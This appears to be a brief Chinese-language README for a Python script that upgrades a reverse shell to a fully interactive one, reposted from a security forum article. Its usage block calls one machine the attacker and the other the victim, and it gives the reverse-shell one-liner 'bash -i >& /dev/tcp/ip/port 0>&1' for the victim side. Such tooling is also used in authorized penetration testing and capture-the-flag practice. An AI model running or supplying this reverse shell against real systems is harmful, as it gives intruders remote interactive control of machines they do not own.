# python-fully-interactive-reverse-shell-script
python获取完全交互的反弹shell脚本



转载于先知社区 https://xz.aliyun.com/t/7721

师傅们详细的可以看全文


```
在攻击机

python  python-fully-interactive-reverse-shell-script.py  port


在受害机

反弹shell即可 例如：bash -i >& /dev/tcp/ip/port 0>&1

即可大几率获取完全交互的shell
```
